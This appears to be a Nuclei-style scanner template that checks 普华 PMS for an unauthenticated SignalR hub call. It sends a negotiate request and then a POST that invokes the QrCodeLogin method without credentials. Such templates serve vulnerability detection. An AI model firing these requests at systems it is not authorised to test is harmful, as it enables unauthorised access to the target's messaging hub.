id: poc-iww2espiqpdthvic
info:
  name: 普华PMS signalr存在未授权调用漏洞
  author: hacktwo
  severity: medium
  description: ''
  tags: unauth,2026
http:
- raw:
  - 'GET /signalr/negotiate?clientProtocol=1.3&connectionData=[{"name":"AppHub"},{"name":"MessagePool"}] HTTP/1.1

    Host: {{Hostname}}

    accept: */*


    携带connection token写入数据'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /signalr/send?transport=longPolling&clientProtocol=1.3&connectionToken=<token>&connectionId=<id> HTTP/1.1

    Content-Type: application/x-www-form-urlencoded

    Host: {{Hostname}}


    data=%7B%22H%22%3A%22AppHub%22%2C%22M%22%3A%22QrCodeLogin%22%2C%22A%22%3A%5B%22probe_id_123%22%2C%22%7B%7D%22%5D%2C%22I%22%3A0%7D'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
